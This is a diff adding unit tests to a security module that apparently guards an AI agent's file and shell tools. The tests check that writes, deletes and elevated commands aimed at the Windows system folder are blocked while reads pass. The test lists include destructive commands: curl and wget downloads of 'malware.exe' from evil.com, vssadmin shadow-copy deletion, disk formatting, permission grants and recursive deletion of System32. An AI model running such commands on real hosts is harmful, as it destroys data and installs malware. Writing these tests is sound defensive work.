@@ -11,6 +11,7 @@ from security import (
     validate_path_safety,
     validate_python_code,
     validate_read_safety,
+    validate_script_content,
 )
 
 
@@ -364,7 +365,10 @@ class TestPathSafety(unittest.TestCase):
         for p in protected:
             is_safe, reason = validate_path_safety(p, operation="delete")
             self.assertFalse(is_safe, f"Protected path was not blocked: '{p}'")
-            self.assertIn("prohibited in protected system path", reason)
+            self.assertTrue(
+                "prohibited in protected system path" in reason or "HARDCODED SECURITY RESTRICTION" in reason,
+                f"Unexpected reason: {reason}",
+            )
 
     def test_extended_and_unc_paths_blocked(self):
         """Ensure Windows extended prefixes (\\\\?\\, \\\\.\\) and UNC admin shares are blocked."""
@@ -551,6 +555,258 @@ class TestLaunchSafety(unittest.TestCase):
             is_safe, reason = validate_launch_safety(t)
             self.assertFalse(is_safe, f"Dangerous launch target '{t}' was not blocked")
             self.assertIn("prohibited", reason.lower())
+
+
+class TestHostOSWriteProtection(unittest.TestCase):
+    """Test suite verifying hardcoded, non-bypassable host OS folder write lock and read-only permission."""
+
+    def test_host_os_write_operations_unconditionally_blocked(self):
+        """Ensure all write/modify/delete/create operations on host OS folder variants are blocked."""
+        host_os_paths = [
+            r"C:\Windows",
+            r"C:\Windows\System32",
+            r"C:\Windows\SysWOW64",
+            r"C:\Windows\System32\drivers\etc\hosts",
+            r"C:\Windows\Temp\test.txt",
+            r"C:/windows/system32/test.dll",
+            r"C:\Windows\..\Windows\System32\cmd.exe",
+            r"\\?\C:\Windows\test.txt",
+            r"\\.\C:\Windows\test.txt",
+            r"\\localhost\c$\Windows\test.txt",
+            r"C:\WINDOW~1\test.txt",
+            r"%SystemRoot%\test.txt",
+            r"$env:windir\test.txt",
+        ]
+        write_operations = ["write", "delete", "move", "create", "append", "truncate", "modify"]
+
+        for path in host_os_paths:
+            for op in write_operations:
+                is_safe, reason = validate_path_safety(path, operation=op)
+                self.assertFalse(is_safe, f"Write op '{op}' was not blocked on host OS path '{path}'")
+                self.assertIn("SECURITY POLICY VIOLATION", reason)
+                self.assertIn("HARDCODED SECURITY RESTRICTION", reason)
+                self.assertIn("strictly read-only", reason)
+
+    def test_host_os_read_operations_permitted(self):
+        """Ensure read-only operations on host OS folder are permitted."""
+        read_paths = [
+            r"C:\Windows",
+            r"C:\Windows\System32",
+            r"C:\Windows\System32\drivers\etc\hosts",
+        ]
+        read_operations = ["read", "get", "stat", "list", "search", "info", "inspect", "query"]
+
+        for path in read_paths:
+            for op in read_operations:
+                is_safe, reason = validate_path_safety(path, operation=op)
+                self.assertTrue(is_safe, f"Read op '{op}' was falsely blocked on host OS path '{path}': {reason}")
+                self.assertIsNone(reason)
+
+    def test_commands_writing_to_host_os_blocked(self):
+        """Ensure shell commands attempting to write, redirect, or modify host OS files are blocked."""
+        dangerous_commands = [
+            "echo hello > C:\\Windows\\test.txt",
+            "echo hello >> C:\\Windows\\test.txt",
+            'echo hello > "C:\\Windows\\test.txt"',
+            "echo hello > C:/windows/test.txt",
+            "echo hello > C:\\WINDOW~1\\test.txt",
+            "echo hello > %SystemRoot%\\test.txt",
+            "echo hello > $env:windir\\test.txt",
+            "1> C:\\Windows\\out.txt",
+            "Get-Process | Out-File C:\\Windows\\proc.txt",
+            "Set-Content -Path C:\\Windows\\test.txt -Value 'bad'",
+            "Add-Content -Path C:\\Windows\\test.txt -Value 'bad'",
+            "New-Item -Path C:\\Windows\\test.txt",
+            "del C:\\Windows\\System32\\test.txt",
+            "erase C:\\Windows\\test.txt",
+            "copy file.txt C:\\Windows\\test.txt",
+            "xcopy file.txt C:\\Windows\\ /y",
+            "robocopy dir C:\\Windows",
+            "move file.txt C:\\Windows\\test.txt",
+            "move C:\\Windows\\test.txt file.txt",
+            "mkdir C:\\Windows\\new_folder",
+            "md C:\\Windows\\new_folder",
+            "takeown /f C:\\Windows",
+            "icacls C:\\Windows /grant Everyone:F",
+            "attrib +h C:\\Windows\\test.txt",
+            "[System.IO.File]::WriteAllText('C:\\Windows\\test.txt', 'evil')",
+            "curl -o C:\\Windows\\malware.exe http://evil.com",
+            "wget -O C:\\Windows\\malware.exe http://evil.com",
+            "Expand-Archive -Path a.zip -DestinationPath C:\\Windows",
+        ]
+        for cmd in dangerous_commands:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Write command to host OS was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+    def test_benign_read_commands_in_host_os_allowed(self):
+        """Ensure benign read and inspection commands targeting host OS folder are permitted."""
+        benign_commands = [
+            "dir C:\\Windows",
+            "dir C:\\Windows\\System32",
+            "Get-ChildItem C:\\Windows",
+            r"type C:\Windows\System32\drivers\etc\hosts",
+            "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "whoami",
+            "Get-Item C:\\Windows\\notepad.exe",
+            "Test-Path C:\\Windows\\System32",
+        ]
+        for cmd in benign_commands:
+            is_safe, reason = validate_command(cmd)
+            self.assertTrue(is_safe, f"Benign read command in host OS was falsely blocked: '{cmd}': {reason}")
+            self.assertIsNone(reason)
+
+    def test_python_host_os_write_blocked_and_read_allowed(self):
+        """Ensure Python AST blocks writes to host OS folder while allowing reads."""
+        write_code_snippets = [
+            'open("C:\\\\Windows\\\\test.txt", "w")',
+            'open("C:\\\\Windows\\\\test.txt", "a")',
+            'open("C:\\\\Windows\\\\test.txt", "w+")',
+            'open("C:\\\\Windows\\\\test.txt", "x")',
+            'open("C:\\\\Windows\\\\test.txt", mode="w")',
+            'open("C:\\\\WINDOW~1\\\\test.txt", "w")',
+            'import shutil\nshutil.copy("safe.txt", "C:\\\\Windows\\\\safe.txt")',
+            'import shutil\nshutil.move("safe.txt", "C:\\\\Windows\\\\safe.txt")',
+            'import os\nos.remove("C:\\\\Windows\\\\test.txt")',
+            'import os\nos.mkdir("C:\\\\Windows\\\\new_dir")',
+            'from pathlib import Path\nPath("C:/Windows/test.txt").write_text("bad")',
+        ]
+        for code in write_code_snippets:
+            is_safe, reason = validate_python_code(code)
+            self.assertFalse(is_safe, f"Python write to host OS was not blocked: '{code}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+        # Read-only Python code must be allowed
+        read_code_snippets = [
+            'with open(r"C:\\Windows\\System32\\drivers\\etc\\hosts", "r") as f:\n    content = f.read()',
+            'from pathlib import Path\ncontent = Path(r"C:\\Windows\\System32\\drivers\\etc\\hosts").read_text()',
+            'import os\nfiles = os.listdir(r"C:\\Windows")',
+        ]
+        for code in read_code_snippets:
+            is_safe, reason = validate_python_code(code)
+            self.assertTrue(is_safe, f"Python read of host OS file was falsely blocked: '{code}': {reason}")
+            self.assertIsNone(reason)
+
+    def test_elevation_cannot_bypass_host_os_write_lock(self):
+        """Ensure administrative elevation cannot bypass the hardcoded host OS write restriction."""
+        from security import execute_elevated
+        elevation_attempts = [
+            "echo test > C:\\Windows\\test.txt",
+            "Remove-Item C:\\Windows\\System32\\test.txt",
+            "Set-Content -Path C:\\Windows\\test.txt -Value 'evil'",
+            "del C:\\Windows\\test.txt",
+            "mkdir C:\\Windows\\hack",
+        ]
+        for cmd in elevation_attempts:
+            res = execute_elevated(cmd)
+            self.assertEqual(res["return_code"], -1)
+            self.assertFalse(res["elevated"])
+            self.assertIn("SECURITY POLICY VIOLATION", res["stderr"])
+
+        # Write inside host OS working directory must also be blocked
+        res_cwd = execute_elevated("echo test > file.txt", working_dir=r"C:\Windows")
+        self.assertEqual(res_cwd["return_code"], -1)
+        self.assertFalse(res_cwd["elevated"])
+        self.assertIn("SECURITY POLICY VIOLATION", res_cwd["stderr"])
+
+    def test_validate_script_content_blocks_dangerous_scripts(self):
+        """Ensure script content validation blocks dangerous commands and host OS write attempts."""
+        dangerous_scripts = [
+            ("Copy-Item malware.dll C:\\Windows\\System32\\", "exploit.ps1"),
+            ("Set-Content -Path C:\\Windows\\test.txt -Value 'evil'", "exploit.ps1"),
+            ("echo payload > C:\\Windows\\System32\\evil.exe", "exploit.bat"),
+            ("del C:\\Windows\\System32\\drivers\\etc\\hosts", "exploit.cmd"),
+            ("vssadmin delete shadows /all /quiet", "ransomware.ps1"),
+            ("format D: /fs:ntfs /q", "format.bat"),
+            ("import shutil\nshutil.rmtree('C:/Windows')", "exploit.py"),
+            ("import os\nopen('C:/Windows/hack.txt', 'w').write('pwned')", "exploit.py"),
+        ]
+        for content, filename in dangerous_scripts:
+            is_safe, err = validate_script_content(content, filename)
+            self.assertFalse(is_safe, f"Expected dangerous script '{filename}' to be blocked.")
+            self.assertIsNotNone(err)
+            self.assertIn("SECURITY RESTRICTION", err)
+
+        # Benign scripts must be allowed
+        benign_scripts = [
+            ("Write-Output 'Hello World'\nGet-Process", "clean.ps1"),
+            ("echo Hello World\ndir\nexit /b 0", "clean.bat"),
+            ("print('Hello World')\nx = [i**2 for i in range(10)]", "clean.py"),
+        ]
+        for content, filename in benign_scripts:
+            is_safe, err = validate_script_content(content, filename)
+            self.assertTrue(is_safe, f"Expected benign script '{filename}' to be allowed, got error: {err}")
+            self.assertIsNone(err)
+
+        # Non-script files (e.g. markdown documentation mentioning commands) must not be falsely blocked
+        doc_content = "This doc mentions del C:\\Windows but is just text"
+        is_safe, err = validate_script_content(doc_content, "README.md")
+        self.assertTrue(is_safe)
+        self.assertIsNone(err)
+
+    def test_validate_command_blocks_referenced_malicious_scripts(self):
+        """Ensure validate_command inspects referenced script files on disk and blocks dangerous scripts."""
+        with tempfile.TemporaryDirectory() as temp_dir:
+            bad_ps1 = os.path.join(temp_dir, "bad.ps1")
+            with open(bad_ps1, "w", encoding="utf-8") as f:
+                f.write("Copy-Item test.dll C:\\Windows\\System32\\test.dll\n")
+
+            bad_bat = os.path.join(temp_dir, "bad.bat")
+            with open(bad_bat, "w", encoding="utf-8") as f:
+                f.write("del C:\\Windows\\System32\\bad.dll\n")
+
+            good_ps1 = os.path.join(temp_dir, "good.ps1")
+            with open(good_ps1, "w", encoding="utf-8") as f:
+                f.write("Write-Output 'Benign script execution'\n")
+
+            # Executing bad scripts must be blocked
+            is_safe, err = validate_command(f"powershell -ExecutionPolicy Bypass -File {bad_ps1}")
+            self.assertFalse(is_safe)
+            self.assertIn("Referenced script 'bad.ps1' failed security audit", err)
+
+            is_safe, err = validate_command(f"& '{bad_ps1}'")
+            self.assertFalse(is_safe)
+            self.assertIn("Referenced script 'bad.ps1' failed security audit", err)
+
+            is_safe, err = validate_command(f"cmd /c {bad_bat}")
+            self.assertFalse(is_safe)
+            self.assertIn("Referenced script 'bad.bat' failed security audit", err)
+
+            # Executing good script must be permitted
+            is_safe, err = validate_command(f"powershell -File {good_ps1}")
+            self.assertTrue(is_safe, f"Expected good script to be allowed, got error: {err}")
+            self.assertIsNone(err)
+
+    def test_write_file_blocks_dropper_scripts(self):
+        """Ensure write_file prevents writing malicious script droppers to disk."""
+        from tools.filesystem_tools import write_file
+        with tempfile.TemporaryDirectory() as temp_dir:
+            bad_path = os.path.join(temp_dir, "dropper.ps1")
+            res = write_file(bad_path, "Remove-Item -Recurse C:\\Windows\\System32\\drivers")
+            self.assertFalse(res["success"])
+            self.assertTrue(res.get("blocked_by_guardrail"))
+            self.assertIn("SECURITY RESTRICTION", res["error"])
+            self.assertFalse(os.path.exists(bad_path), "Malicious dropper script must not exist on disk!")
+
+            # Benign script writing must succeed
+            good_path = os.path.join(temp_dir, "safe.ps1")
+            res_good = write_file(good_path, "Write-Host 'Safe script'")
+            self.assertTrue(res_good["success"])
+            self.assertTrue(os.path.exists(good_path))
+
+    def test_execute_elevated_blocks_referenced_malicious_scripts(self):
+        """Ensure execute_elevated intercepts and rejects referenced malicious scripts before UAC."""
+        from security import execute_elevated
+        with tempfile.TemporaryDirectory() as temp_dir:
+            bad_ps1 = os.path.join(temp_dir, "elev_exploit.ps1")
+            with open(bad_ps1, "w", encoding="utf-8") as f:
+                f.write("Remove-Item -Recurse C:\\Windows\\System32\n")
+
+            res = execute_elevated(f"powershell -File {bad_ps1}")
+            self.assertEqual(res["return_code"], -1)
+            self.assertFalse(res["elevated"])
+            self.assertIn("SECURITY POLICY VIOLATION", res["stderr"])
+            self.assertIn("elev_exploit.ps1", res["stderr"])
 
 
 if __name__ == "__main__":
